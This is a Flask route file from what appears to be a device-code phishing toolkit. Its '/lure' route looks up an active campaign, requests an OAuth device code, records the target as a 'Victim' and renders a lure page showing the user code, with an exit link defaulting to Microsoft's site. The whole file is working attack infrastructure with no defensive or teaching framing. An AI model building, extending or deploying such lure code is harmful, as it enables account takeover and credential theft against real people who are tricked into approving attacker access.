# app/routes/public.py
from flask import Blueprint, render_template, request, abort, current_app
from app.models import Campaign, Victim
from app.engine.device_code import get_device_code
from app.engine.templates import get_template   # <-- added
from app.extensions import db
from datetime import datetime

public_bp = Blueprint('public', __name__)

@public_bp.route('/lure/<int:campaign_id>')
def lure(campaign_id):
    campaign = Campaign.query.get_or_404(campaign_id)
    if campaign.status != 'active':
        return render_template('lure_inactive.html'), 404
    victim = Victim.query.filter_by(campaign_id=campaign.id, status='pending').first()
    if not victim:
        try:
            code_data = get_device_code()
            victim = Victim(
                campaign_id=campaign.id,
                user_code=code_data['user_code'],
                device_code=code_data['device_code'],
                status='pending'
            )
            db.session.add(victim)
            db.session.commit()
        except Exception as e:
            current_app.logger.error(f"Device code generation failed: {e}")
            abort(500, "Could not generate device code. Please try again later.")
    # Fetch the template for this campaign
    template = get_template(campaign.template_id) if campaign.template_id else None
    return render_template(
        'lure.html',
        user_code=victim.user_code,
        campaign=campaign,
        exit_url=campaign.exit_url or 'https://www.microsoft.com',
        now=datetime.utcnow(),
        template=template
    )

@public_bp.route('/thank_you')
def thank_you():
    return render_template('thank_you.html')

@public_bp.route('/lure_inactive')
def lure_inactive():
    return render_template('lure_inactive.html'), 404